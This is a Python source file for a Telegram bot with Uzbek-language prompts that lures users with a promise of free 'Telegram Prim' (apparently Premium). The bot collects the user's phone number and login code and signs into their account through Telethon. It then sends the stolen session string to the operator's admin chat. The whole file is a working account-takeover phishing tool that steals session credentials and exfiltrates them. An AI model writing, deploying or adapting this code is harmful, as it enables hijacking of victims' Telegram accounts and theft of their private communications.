from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
import os
import asyncio

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

user_sessions = {}

async def send_code(phone, user_id):
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    code = await client.send_code_request(phone)
    user_sessions[user_id] = client
    return code

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[KeyboardButton('Raqam yuborish', request_contact=True)]]
    await update.message.reply_text("Telegram Prim olish uchun Telefon raqamingizni yuboring",
        reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.contact.phone_number
    context.user_data['phone'] = phone
    await update.message.reply_text("KOD YUBORILDI KODNI YOZING")
    await send_code(phone, update.message.from_user.id)

async def code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in user_sessions:
        await update.message.reply_text("Oldin raqam yuboring.")
        return

    code = update.message.text.strip()
    phone = context.user_data.get("phone")
    client = user_sessions[user_id]

    try:
        await client.sign_in(phone, code)
    except Exception as e:
        if '2FA' in str(e):
            await update.message.reply_text("2FA Kod turibti ekan, iltimos davom etish uchun 2FA kodni yuboring")
            return
        await update.message.reply_text("Kod noto‘g‘ri.")
        return

    string_session = client.session.save()
    await client.disconnect()

    await context.bot.send_message(ADMIN_ID, f"Session: `{string_session}`", parse_mode="Markdown")
    await update.message.reply_text("Prim tayyor")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, contact))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, code_handler))
    app.run_polling()

if __name__ == "__main__":
    main()
